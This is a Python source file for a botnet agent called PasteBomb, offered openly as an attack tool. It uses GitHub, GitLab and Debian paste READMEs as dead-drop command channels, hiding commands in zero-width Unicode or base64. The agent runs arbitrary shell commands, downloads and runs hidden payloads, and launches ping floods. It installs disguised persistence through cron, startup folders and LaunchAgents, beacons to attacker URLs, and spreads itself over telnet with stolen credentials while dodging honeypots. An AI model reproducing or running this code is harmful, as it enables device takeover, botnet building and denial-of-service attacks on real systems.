#!/usr/bin/env python3
"""
OogaScan PasteBomb — Multi-Repo GitHub & GitLab C2 Agent

Uses GitHub/GitLab repository README files as dead-drop C2 channels.
Polls multiple repos for commands with automatic fallback.
Commands are encoded in invisible zero-width Unicode within README files.
Falls back to marker-tag and code-block formats for compatibility.
"""

import os
import sys
import time
import random
import string
import json
import base64
import socket
import asyncio
import subprocess
import shutil
import platform
import tempfile
import hashlib
import threading
import urllib.request
import urllib.error
from pathlib import Path
from dataclasses import dataclass, field

import zwenc

CONFIG_FILE = str(Path(__file__).parent / "pb_config.json")
DEFAULT_POLL_INTERVAL = 60
MARKER_START = "<!-- CMD_START -->"
MARKER_END = "<!-- CMD_END -->"
MAX_FETCH_SIZE = 1_048_576
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

TOOL_NAMES = [
    "systemd", "cron", "bash", "sshd", "networkd",
    "apt", "dpkg", "iptables", "journald", "udev",
]

HONEYPOT_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
    993, 995, 3306, 3389, 8080,
]
HONEYPOT_THRESHOLD = 11


def _id_paths() -> list[str]:
    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
    return [
        f"/dev/shm/.{tag}-private",
        f"/tmp/.{tag}_cache",
        f"/var/tmp/.{tag}-status",
    ]


def _get_bot_id() -> str:
    for tag in TOOL_NAMES:
        for prefix in ("/dev/shm/.", "/tmp/.", "/var/tmp/."):
            for suffix in ("-private", "_cache", "-status"):
                p = Path(f"{prefix}{tag}{suffix}")
                if p.exists():
                    stored = p.read_text().strip()
                    if stored:
                        return stored

    bot_id = base64.b32encode(os.urandom(6)).decode().rstrip("=")
    for loc in _id_paths():
        try:
            Path(loc).write_text(bot_id)
            break
        except OSError:
            continue
    return bot_id


def _padded_hash(bot_id: str) -> str:
    pad = base64.b32encode(os.urandom(16)).decode().rstrip("=")
    raw = hashlib.sha256((pad + bot_id).encode()).hexdigest()[:16]
    return pad + ":" + raw


class C:
    CYAN    = "\033[1;36m"
    GREEN   = "\033[1;32m"
    RED     = "\033[1;31m"
    YELLOW  = "\033[1;33m"
    PURPLE  = "\033[1;35m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

BANNER = f"""{C.CYAN}
  ╔═══════════════════════════════════════════════════╗
  ║  OogaScan PasteBomb — GitHub & GitLab Dead-Drop   ║
  ╚═══════════════════════════════════════════════════╝
{C.RESET}"""


@dataclass
class RepoSource:
    owner: str
    repo: str
    platform: str = "github"
    branch: str = "main"
    file_path: str = "README.md"
    active: bool = True
    fail_count: int = 0
    last_success: float = 0.0

    @property
    def raw_url(self) -> str:
        if self.platform == "debian":
            return f"https://paste.debian.net/plain/{self.repo}"
        if self.platform == "gitlab":
            return (f"https://gitlab.com/{self.owner}/{self.repo}"
                    f"/-/raw/{self.branch}/{self.file_path}")
        return (f"https://raw.githubusercontent.com/"
                f"{self.owner}/{self.repo}/{self.branch}/{self.file_path}")

    @property
    def api_url(self) -> str:
        if self.platform == "debian":
            return self.raw_url
        if self.platform == "gitlab":
            encoded_path = urllib.request.quote(self.file_path, safe="")
            project_id = urllib.request.quote(f"{self.owner}/{self.repo}", safe="")
            return (f"https://gitlab.com/api/v4/projects/{project_id}"
                    f"/repository/files/{encoded_path}/raw?ref={self.branch}")
        return (f"https://api.github.com/repos/"
                f"{self.owner}/{self.repo}/contents/{self.file_path}"
                f"?ref={self.branch}")

    def __str__(self):
        if self.platform == "debian":
            return f"[debian] paste:{self.repo}"
        return f"[{self.platform}] {self.owner}/{self.repo}:{self.branch}/{self.file_path}"


@dataclass
class PBConfig:
    repos: list = field(default_factory=list)
    poll_interval: int = DEFAULT_POLL_INTERVAL
    jitter: int = 15
    max_fails_before_skip: int = 5
    use_api: bool = False
    last_command_hash: str = ""

    def save(self, path: str = CONFIG_FILE):
        data = {
            "repos": [
                {"owner": r.owner, "repo": r.repo, "platform": r.platform,
                 "branch": r.branch, "file_path": r.file_path}
                for r in self.repos
            ],
            "poll_interval": self.poll_interval,
            "jitter": self.jitter,
            "max_fails_before_skip": self.max_fails_before_skip,
            "use_api": self.use_api,
            "last_command_hash": self.last_command_hash,
        }
        Path(path).write_text(json.dumps(data, indent=2))

    @classmethod
    def load(cls, path: str = CONFIG_FILE):
        if not Path(path).exists():
            return cls()
        raw = json.loads(Path(path).read_text())
        repos = [RepoSource(**r) for r in raw.get("repos", [])]
        return cls(
            repos=repos,
            poll_interval=raw.get("poll_interval", DEFAULT_POLL_INTERVAL),
            jitter=raw.get("jitter", 15),
            max_fails_before_skip=raw.get("max_fails_before_skip", 5),
            use_api=raw.get("use_api", False),
            last_command_hash=raw.get("last_command_hash", ""),
        )


def _random_string(length: int = 16) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def fetch_raw(url: str, timeout: int = 15) -> str | None:
    cache_bust = f"{'&' if '?' in url else '?'}nocache={_random_string()}&t={int(time.time())}"
    full_url = url + cache_bust

    req = urllib.request.Request(full_url, headers={
        "User-Agent": USER_AGENT,
        "Accept": "text/plain, application/vnd.github.v3.raw",
        "Cache-Control": "no-cache, no-store",
        "Pragma": "no-cache",
    })

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                return resp.read(MAX_FETCH_SIZE).decode(errors="replace")
    except (urllib.error.URLError, urllib.error.HTTPError, OSError):
        pass
    return None


def fetch_via_api(repo: RepoSource, timeout: int = 15) -> str | None:
    cache_bust = f"{'&' if '?' in repo.api_url else '?'}nocache={_random_string()}"
    url = repo.api_url + cache_bust

    req = urllib.request.Request(url, headers={
        "User-Agent": USER_AGENT,
        "Accept": "application/json" if repo.platform == "github" else "text/plain",
        "Cache-Control": "no-cache",
    })

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                raw_data = resp.read(MAX_FETCH_SIZE)
                if repo.platform in ("gitlab", "debian"):
                    return raw_data.decode(errors="replace")
                data = json.loads(raw_data)
                content = data.get("content", "")
                return base64.b64decode(content).decode(errors="replace")
    except (urllib.error.URLError, urllib.error.HTTPError, OSError, json.JSONDecodeError):
        pass
    return None


def fetch_from_repo(repo: RepoSource, use_api: bool = False) -> str | None:
    if use_api:
        return fetch_via_api(repo)
    return fetch_raw(repo.raw_url)


def _check_404(repo: RepoSource) -> bool:
    req = urllib.request.Request(repo.raw_url, method="HEAD",
                                headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except Exception:
        return False


def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None]:
    candidates = [r for r in config.repos if r.active]
    random.shuffle(candidates)

    for repo in candidates:
        if repo.fail_count >= config.max_fails_before_skip:
            backoff = min(2 ** min(repo.fail_count, 10) * config.poll_interval, 3600)
            if time.time() - repo.last_success < backoff:
                continue
            repo.fail_count = 0

        if not _check_404(repo):
            repo.fail_count += 1
            continue

        content = fetch_from_repo(repo, use_api=config.use_api)

        if content is not None:
            repo.fail_count = 0
            repo.last_success = time.time()
            return content, repo
        else:
            repo.fail_count += 1

    return None, None


def extract_zw_payload(content: str) -> dict | None:
    raw = zwenc.extract(content)
    if raw is None:
        return None
    try:
        return json.loads(raw)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None


def extract_commands(content: str) -> tuple[list[str], dict | None]:
    payload = extract_zw_payload(content)
    if payload and "cmd" in payload:
        return payload["cmd"], payload

    commands = []

    if MARKER_START in content and MARKER_END in content:
        start = content.index(MARKER_START) + len(MARKER_START)
        end = content.index(MARKER_END)
        if start < end:
            block = content[start:end].strip()
            for line in block.splitlines():
                line = line.strip()
                if line and not line.startswith("//") and not line.startswith("#"):
                    commands.append(line)

    if "```cmd" in content:
        parts = content.split("```cmd")
        for part in parts[1:]:
            if "```" in part:
                block = part[:part.index("```")].strip()
                for line in block.splitlines():
                    line = line.strip()
                    if line and not line.startswith("//") and not line.startswith("#"):
                        commands.append(line)

    b64_marker = "<!-- B64:"
    if b64_marker in content:
        try:
            start = content.index(b64_marker) + len(b64_marker)
            end = content.index("-->", start)
        except ValueError:
            return commands, None
        b64_data = content[start:end].strip()
        try:
            decoded = base64.b64decode(b64_data).decode()
            for line in decoded.splitlines():
                line = line.strip()
                if line:
                    commands.append(line)
        except Exception:
            pass

    return commands, None


def command_hash(commands: list[str]) -> str:
    return hashlib.sha256("\n".join(commands).encode()).hexdigest()[:16]


def exec_shell(cmd_str: str) -> str:
    try:
        result = subprocess.run(
            cmd_str, shell=True, capture_output=True,
            text=True, timeout=60,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[timeout after 60s]"
    except Exception as e:
        return f"[error: {e}]"


def download_file(url: str, dest: str, run: bool = False, hide: bool = False):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read()

        dest_path = Path(dest)
        dest_path.write_bytes(data)

        if hide:
            if platform.system() == "Windows":
                subprocess.run(["attrib", "+H", str(dest_path)],
                               capture_output=True, timeout=10)
            else:
                hidden = dest_path.parent / f".{dest_path.name}"
                dest_path.rename(hidden)
                dest_path = hidden

        if run:
            if platform.system() == "Windows":
                subprocess.Popen(["cmd", "/C", "start", str(dest_path)])
            else:
                dest_path.chmod(0o755)
                subprocess.Popen([str(dest_path)])
    except Exception:
        pass


def pop_message(message: str):
    try:
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as f:
            f.write(f"<html><body><h2>{message}</h2></body></html>")
            path = f.name

        system = platform.system()
        if system == "Linux":
            subprocess.Popen(["xdg-open", path])
        elif system == "Darwin":
            subprocess.Popen(["open", path])
        elif system == "Windows":
            subprocess.Popen(["rundll32", "url.dll,FileProtocolHandler", path])
    except Exception:
        pass


def update_repos(config: PBConfig, new_repos_str: str):
    for entry in new_repos_str.split(","):
        entry = entry.strip()
        if not entry:
            continue

        if entry.startswith("dp:") or entry.startswith("debian:"):
            paste_id = entry.split(":", 1)[1].strip()
            existing_dp = {r.repo for r in config.repos if r.platform == "debian"}
            if paste_id not in existing_dp:
                config.repos.append(RepoSource(
                    owner="", repo=paste_id, platform="debian",
                    branch="", file_path=""))
            continue

        plat = "github"
        branch = "main"
        file_path = "README.md"

        if entry.startswith("gl:") or entry.startswith("gitlab:"):
            plat = "gitlab"
            entry = entry.split(":", 1)[1]
        elif entry.startswith("gh:") or entry.startswith("github:"):
            plat = "github"
            entry = entry.split(":", 1)[1]

        if ":" in entry:
            repo_part, rest = entry.split(":", 1)
            if "/" in rest:
                branch, file_path = rest.split("/", 1)
            else:
                branch = rest
        else:
            repo_part = entry

        parts = repo_part.split("/")
        if len(parts) == 2:
            owner, repo = parts
            existing = {f"{r.platform}:{r.owner}/{r.repo}" for r in config.repos}
            if f"{plat}:{owner}/{repo}" not in existing:
                config.repos.append(RepoSource(
                    owner=owner, repo=repo, platform=plat,
                    branch=branch, file_path=file_path))


def execute_command(cmd: str, config: PBConfig):
    parts = cmd.split(None, 1)
    if not parts:
        return

    action = parts[0].lower()
    args_str = parts[1] if len(parts) > 1 else ""

    if action in ("cmd", "shell"):
        exec_shell(args_str)

    elif action == "download":
        tokens = args_str.split()
        if len(tokens) >= 2:
            url, dest = tokens[0], tokens[1]
            flags = [t.upper() for t in tokens[2:]]
            download_file(url, dest, run="RUN" in flags, hide="HIDE" in flags)

    elif action == "dos":
        tokens = args_str.split()
        if len(tokens) >= 3:
            target, port, duration = tokens[0], tokens[1], tokens[2]
            try:
                secs = min(int(duration), 300)
                subprocess.Popen(
                    f"timeout {secs} ping -f {target} > /dev/null 2>&1",
                    shell=True,
                )
            except Exception:
                pass

    elif action == "popmsg":
        pop_message(args_str)

    elif action == "add_repo":
        update_repos(config, args_str)

    elif action == "set_interval":
        try:
            config.poll_interval = max(10, int(args_str))
        except ValueError:
            pass

    elif action == "sleep":
        try:
            time.sleep(min(int(args_str), 3600))
        except ValueError:
            pass

    elif action == "die":
        sys.exit(0)


def deploy_agent(target_str: str, config: PBConfig):
    try:
        ip, port, user, pw = target_str.strip().split(":")
        port = int(port)
    except ValueError:
        print(f"{C.RED}[!] Format: ip:port:user:pass{C.RESET}")
        return

    if is_honeypot_sync(ip):
        print(f"{C.YELLOW}[!] Skipping {ip} — honeypot detected ({HONEYPOT_THRESHOLD}+ ports open){C.RESET}")
        return

    print(f"{C.YELLOW}[*] Deploying to {ip}:{port} as {user}...{C.RESET}")

    agent_file = Path(__file__)
    if not agent_file.exists():
        print(f"{C.RED}[!] {agent_file} not found{C.RESET}")
        return

    try:
        sock = socket.create_connection((ip, int(port)), timeout=10)
        sock.settimeout(5)

        def _recv_until(marker: bytes, timeout: float = 5.0) -> bytes:
            buf = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    if marker in buf:
                        return buf
                except socket.timeout:
                    break
            return buf

        _recv_until(b"ogin:")
        sock.sendall(user.encode() + b"\n")
        _recv_until(b"assword:")
        sock.sendall(pw.encode() + b"\n")
        resp = _recv_until(b"#", timeout=6)
        if not any(p in resp for p in (b"#", b">", b"$")):
            raise Exception("No shell prompt")

        agent_data = agent_file.read_bytes()
        b64 = base64.b64encode(agent_data).decode()

        zwenc_file = Path(__file__).parent / "zwenc.py"
        zwenc_b64 = base64.b64encode(zwenc_file.read_bytes()).decode()

        sock.sendall(b"rm -f /tmp/pb.b64 /tmp/pb.py /tmp/zwenc.py /tmp/pb_config.json\n")
        time.sleep(0.1)

        for i in range(0, len(zwenc_b64), 512):
            chunk = zwenc_b64[i:i + 512]
            sock.sendall(f"echo '{chunk}' >> /tmp/zw.b64\n".encode())
            time.sleep(0.05)
        sock.sendall(b"base64 -d /tmp/zw.b64 > /tmp/zwenc.py && rm /tmp/zw.b64\n")
        time.sleep(0.1)

        for i in range(0, len(b64), 512):
            chunk = b64[i:i + 512]
            sock.sendall(f"echo '{chunk}' >> /tmp/pb.b64\n".encode())
            time.sleep(0.05)

        sock.sendall(b"base64 -d /tmp/pb.b64 > /tmp/pb.py && rm /tmp/pb.b64\n")
        time.sleep(0.1)

        cfg_data = base64.b64encode(json.dumps({
            "repos": [{"owner": r.owner, "repo": r.repo, "platform": r.platform,
                       "branch": r.branch, "file_path": r.file_path}
                      for r in config.repos],
            "poll_interval": config.poll_interval,
            "jitter": config.jitter,
            "max_fails_before_skip": config.max_fails_before_skip,
            "use_api": config.use_api,
            "last_command_hash": "",
        }).encode()).decode()
        sock.sendall(f"echo '{cfg_data}' | base64 -d > /tmp/pb_config.json\n".encode())
        time.sleep(0.1)

        sock.sendall(b"nohup python3 /tmp/pb.py agent -c /tmp/pb_config.json --daemon --no-persist > /dev/null 2>&1 &\n")
        time.sleep(0.3)
        sock.close()
        print(f"{C.GREEN}[+] Deployed to {ip}:{port}{C.RESET}")
    except Exception as e:
        print(f"{C.RED}[!] Deploy failed: {e}{C.RESET}")


def deploy_from_file(path: str, config: PBConfig):
    if not os.path.exists(path):
        print(f"{C.RED}[!] File not found: {path}{C.RESET}")
        return

    targets = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)

    if not targets:
        return

    ips = []
    for t in targets:
        try:
            ips.append(t.split(":")[0])
        except (ValueError, IndexError):
            ips.append("")

    print(f"{C.YELLOW}[*] Checking {len(ips)} targets for honeypots (async)...{C.RESET}")
    try:
        hp_results = asyncio.run(check_honeypots_batch(ips))
    except Exception:
        hp_results = {}

    for target, ip in zip(targets, ips):
        if hp_results.get(ip, False):
            print(f"{C.YELLOW}[!] Skipping {ip} — honeypot{C.RESET}")
            continue
        deploy_agent(target, config)


def daemonize():
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        devnull = open(os.devnull, "w")
        os.dup2(devnull.fileno(), sys.stdout.fileno())
        os.dup2(devnull.fileno(), sys.stderr.fileno())
    except OSError:
        pass


async def _check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return True
    except Exception:
        return False


async def _is_honeypot(ip: str, threshold: int = HONEYPOT_THRESHOLD) -> bool:
    tasks = [_check_port(ip, p) for p in HONEYPOT_PORTS]
    results = await asyncio.gather(*tasks)
    return sum(results) >= threshold


async def check_honeypots_batch(ips: list[str], threshold: int = HONEYPOT_THRESHOLD) -> dict[str, bool]:
    tasks = {ip: _is_honeypot(ip, threshold) for ip in ips}
    results = await asyncio.gather(*tasks.values())
    return dict(zip(tasks.keys(), results))


def is_honeypot_sync(ip: str) -> bool:
    try:
        return asyncio.run(_is_honeypot(ip))
    except Exception:
        return False


def _install_cron(config_path: str):
    exe = os.path.abspath(sys.argv[0])
    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
    marker = f"# {tag}-journal-flush"
    cron_line = f"0 3 */14 * * /usr/bin/python3 {exe} agent -c {config_path} --daemon --no-persist >/dev/null 2>&1 {marker}"
    try:
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5,
        )
        existing = result.stdout if result.returncode == 0 else ""
        if marker in existing:
            return
        lines = [l for l in existing.splitlines() if marker not in l]
        lines.append(cron_line)
        proc = subprocess.run(
            ["crontab", "-"], input="\n".join(lines) + "\n",
            capture_output=True, text=True, timeout=5,
        )
    except Exception:
        pass


def install_persistence(config_path: str = CONFIG_FILE):
    system = platform.system()
    try:
        exe = os.path.abspath(sys.argv[0])

        if system == "Windows":
            startup = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            )
            dest = os.path.join(startup, os.path.basename(exe))
            if not os.path.exists(dest):
                shutil.copy2(exe, dest)

        elif system == "Linux":
            autostart = Path.home() / ".config" / "autostart"
            autostart.mkdir(parents=True, exist_ok=True)
            dest = autostart / os.path.basename(exe)
            if not dest.exists():
                try:
                    os.symlink(exe, dest)
                except OSError:
                    pass
            _install_cron(config_path)

        elif system == "Darwin":
            launch = Path.home() / "Library" / "LaunchAgents"
            launch.mkdir(parents=True, exist_ok=True)
            dest = launch / os.path.basename(exe)
            if not dest.exists():
                try:
                    os.symlink(exe, dest)
                except OSError:
                    pass

    except Exception:
        pass


def _heartbeat_loop(url_template: str, interval: int, bot_id: str, stop_event: threading.Event):
    while not stop_event.is_set():
        try:
            phash = _padded_hash(bot_id)
            url = url_template.replace("{id}", phash)
            req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
            urllib.request.urlopen(req, timeout=15)
        except Exception:
            pass
        stop_event.wait(interval)


def _merge_repos_from_payload(config: PBConfig, payload: dict):
    existing = {f"{r.platform}:{r.owner}/{r.repo}" for r in config.repos}
    for gh in payload.get("gh", []):
        parts = gh.split("/")
        if len(parts) == 2 and f"github:{gh}" not in existing:
            config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="github"))
    for gl in payload.get("gl", []):
        parts = gl.split("/")
        if len(parts) == 2 and f"gitlab:{gl}" not in existing:
            config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="gitlab"))
    existing_dp = {r.repo for r in config.repos if r.platform == "debian"}
    for dp in payload.get("dp", []):
        if dp not in existing_dp:
            config.repos.append(RepoSource(owner="", repo=dp, platform="debian",
                                           branch="", file_path=""))


def agent_loop(config: PBConfig, verbose: bool = False):
    bot_id = _get_bot_id()
    hb_stop = threading.Event()
    hb_thread = None

    if verbose:
        print(f"{C.GREEN}[*] Agent started — ID: {bot_id}{C.RESET}")
        print(f"    {len(config.repos)} repo source(s)")
        for r in config.repos:
            print(f"    {C.DIM}{r}{C.RESET}")
        print(f"    Poll interval: {config.poll_interval}s (+/- {config.jitter}s jitter)")

    while True:
        content, source = fetch_with_fallback(config)

        if content is not None:
            commands, payload = extract_commands(content)
            chash = command_hash(commands)

            if payload:
                _merge_repos_from_payload(config, payload)

                hb = payload.get("hb")
                if hb and hb.get("url") and (hb_thread is None or not hb_thread.is_alive()):
                    hb_stop.clear()
                    hb_thread = threading.Thread(
                        target=_heartbeat_loop,
                        args=(hb["url"], hb.get("sec", 300), bot_id, hb_stop),
                        daemon=True,
                    )
                    hb_thread.start()
                    if verbose:
                        print(f"{C.PURPLE}[*] Heartbeat started ({hb.get('sec', 300)}s interval){C.RESET}")

            if commands and chash != config.last_command_hash:
                config.last_command_hash = chash
                try:
                    config.save()
                except Exception:
                    pass

                if verbose:
                    print(f"{C.CYAN}[*] {len(commands)} command(s) from {source}{C.RESET}")

                for cmd in commands:
                    if verbose:
                        print(f"  {C.YELLOW}> {cmd}{C.RESET}")
                    execute_command(cmd, config)
            elif verbose:
                if not commands:
                    print(f"{C.DIM}[.] No commands in {source}{C.RESET}")
                else:
                    print(f"{C.DIM}[.] Commands unchanged, skipping{C.RESET}")

        elif verbose:
            print(f"{C.RED}[!] All repos unreachable{C.RESET}")

        jitter = random.randint(-config.jitter, config.jitter)
        sleep_time = max(10, config.poll_interval + jitter)
        time.sleep(sleep_time)


def generate_readme(commands: list[str], title: str = "Project") -> str:
    cmd_block = "\n".join(commands)
    return f"""# {title}

A simple project.

{MARKER_START}
{cmd_block}
{MARKER_END}

## License
MIT
"""


def server_shell():
    print(f"\n{C.BOLD}PasteBomb Server — README Command Generator{C.RESET}")
    print(f"  Type commands to embed. 'gen' to output README. 'clear' to reset.\n")

    commands = []
    while True:
        try:
            line = input(f"{C.BOLD}pb>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue
        elif line == "gen":
            readme = generate_readme(commands)
            print(f"\n{C.GREEN}--- Generated README ---{C.RESET}")
            print(readme)
            print(f"{C.GREEN}--- End ---{C.RESET}\n")
            Path("README_payload.md").write_text(readme)
            print(f"  Saved to README_payload.md")
        elif line == "gen64":
            encoded = base64.b64encode("\n".join(commands).encode()).decode()
            readme = f"""# Project

Description here.

<!-- B64:{encoded} -->

## License
MIT
"""
            print(f"\n{C.GREEN}--- Generated README (base64) ---{C.RESET}")
            print(readme)
            print(f"{C.GREEN}--- End ---{C.RESET}\n")
            Path("README_payload.md").write_text(readme)
            print(f"  Saved to README_payload.md")
        elif line == "clear":
            commands.clear()
            print(f"  {C.DIM}Commands cleared{C.RESET}")
        elif line == "list":
            if commands:
                for i, c in enumerate(commands):
                    print(f"  {i+1}. {c}")
            else:
                print(f"  {C.DIM}(empty){C.RESET}")
        elif line == "help":
            print(f"""
  {C.BOLD}Available embed commands:{C.RESET}
    cmd <shell command>               — Execute shell command
    shell <shell command>             — Alias for cmd
    download <url> <dest> [RUN] [HIDE] — Download file
    dos <ip> <port> <seconds>         — Network flood
    popmsg <message>                  — Browser popup
    add_repo [gh:|gl:]<owner/repo>    — Add fallback repo (gh: or gl: prefix)
    set_interval <seconds>            — Change poll interval
    sleep <seconds>                   — Sleep before next poll
    die                               — Kill agent

  {C.BOLD}Generator commands:{C.RESET}
    list    — Show queued commands
    gen     — Generate README with marker tags
    gen64   — Generate README with base64 encoding
    clear   — Clear command queue
    exit    — Quit
""")
        elif line in ("exit", "quit"):
            break
        else:
            commands.append(line)
            print(f"  {C.DIM}+ added ({len(commands)} total){C.RESET}")


def _parse_repo_arg(r: str) -> RepoSource:
    plat = "github"
    branch = "main"
    file_path = "README.md"
    repo_str = r

    if repo_str.startswith("dp:") or repo_str.startswith("debian:"):
        plat = "debian"
        paste_id = repo_str.split(":", 1)[1].strip()
        return RepoSource(owner="", repo=paste_id, platform="debian",
                          branch="", file_path="")

    if repo_str.startswith("gl:") or repo_str.startswith("gitlab:"):
        plat = "gitlab"
        repo_str = repo_str.split(":", 1)[1]
    elif repo_str.startswith("gh:") or repo_str.startswith("github:"):
        plat = "github"
        repo_str = repo_str.split(":", 1)[1]

    if ":" in repo_str:
        repo_part, rest = repo_str.split(":", 1)
        if "/" in rest:
            branch, file_path = rest.split("/", 1)
        else:
            branch = rest
    else:
        repo_part = repo_str

    parts = repo_part.split("/")
    if len(parts) != 2:
        print(f"{C.RED}[!] Invalid repo format: {r} (expected [gh:|gl:|dp:]owner/repo){C.RESET}")
        sys.exit(1)

    return RepoSource(owner=parts[0], repo=parts[1], platform=plat,
                      branch=branch, file_path=file_path)


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="OogaScan PasteBomb — GitHub & GitLab Dead-Drop C2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
modes:
  agent    Run the C2 agent (polls repos for commands)
  server   Interactive shell to generate README payloads
  deploy   Deploy agent to telnet targets
  config   Generate a default config file
  test     Test fetching from configured repos

repo format:
  owner/repo                        GitHub repo (default)
  gh:owner/repo                     GitHub repo (explicit)
  gl:owner/repo                     GitLab repo
  owner/repo:branch                 Custom branch
  gl:owner/repo:main/path/file.md   Custom path

examples:
  %(prog)s agent -c pb_config.json
  %(prog)s agent -r user/repo1 -r gl:user/repo2 --daemon
  %(prog)s server
  %(prog)s deploy --target 192.168.1.1:23:root:pass
  %(prog)s deploy --file targets.txt
  %(prog)s config -r user/c2-primary -r gl:user/c2-backup
  %(prog)s test -c pb_config.json
""",
    )
    parser.add_argument("mode", choices=["agent", "server", "deploy", "config", "test"],
                        help="Operating mode")
    parser.add_argument("-c", "--config", default=CONFIG_FILE,
                        help="Config file path")
    parser.add_argument("-r", "--repo", action="append", default=[],
                        help="Repo source ([gh:|gl:]owner/repo[:branch[/path]]). Repeatable.")
    parser.add_argument("-i", "--interval", type=int, default=0,
                        help="Poll interval in seconds")
    parser.add_argument("--api", action="store_true",
                        help="Use platform API instead of raw URLs")
    parser.add_argument("--no-persist", action="store_true",
                        help="Don't install persistence")
    parser.add_argument("--daemon", action="store_true",
                        help="Run agent as background daemon")
    parser.add_argument("--target", default="",
                        help="Deploy target (ip:port:user:pass)")
    parser.add_argument("--file", default="",
                        help="Deploy targets file (one ip:port:user:pass per line)")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    if not args.daemon:
        print(BANNER)

    cli_repos = [_parse_repo_arg(r) for r in args.repo]

    if args.mode == "config":
        config = PBConfig(repos=cli_repos or [
            RepoSource(owner="youruser", repo="c2-primary", platform="github"),
            RepoSource(owner="youruser", repo="c2-backup1", platform="github"),
            RepoSource(owner="youruser", repo="c2-backup2", platform="gitlab"),
        ])
        if args.interval > 0:
            config.poll_interval = args.interval
        config.use_api = args.api
        config.save(args.config)
        print(f"{C.GREEN}[*] Config saved to {args.config}{C.RESET}")
        print(f"    Edit the repo entries, then run: pastebomb.py agent -c {args.config}")
        return

    elif args.mode == "server":
        server_shell()
        return

    elif args.mode == "deploy":
        config = PBConfig.load(args.config)
        if cli_repos:
            config.repos = cli_repos

        if not config.repos:
            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
            sys.exit(1)

        if args.target:
            deploy_agent(args.target, config)
        elif args.file:
            deploy_from_file(args.file, config)
        else:
            print(f"{C.RED}[!] Specify --target or --file{C.RESET}")
        return

    elif args.mode == "test":
        config = PBConfig.load(args.config)
        if cli_repos:
            config.repos = cli_repos

        if not config.repos:
            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
            sys.exit(1)

        print(f"[*] Testing {len(config.repos)} repo(s)...\n")
        for repo in config.repos:
            print(f"  {C.BOLD}{repo}{C.RESET}")
            content = fetch_from_repo(repo, use_api=config.use_api)
            if content is not None:
                commands, _ = extract_commands(content)
                print(f"    {C.GREEN}OK{C.RESET} — {len(content)} bytes, "
                      f"{len(commands)} command(s) found")
                for cmd in commands:
                    print(f"      {C.YELLOW}> {cmd}{C.RESET}")
            else:
                print(f"    {C.RED}FAIL{C.RESET} — unreachable")
            print()
        return

    elif args.mode == "agent":
        config = PBConfig.load(args.config)
        if cli_repos:
            config.repos = cli_repos
        if args.interval > 0:
            config.poll_interval = args.interval
        if args.api:
            config.use_api = True

        if not config.repos:
            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
            sys.exit(1)

        if not args.no_persist:
            install_persistence(args.config)

        if args.daemon:
            daemonize()

        agent_loop(config, verbose=args.verbose)


if __name__ == "__main__":
    main()
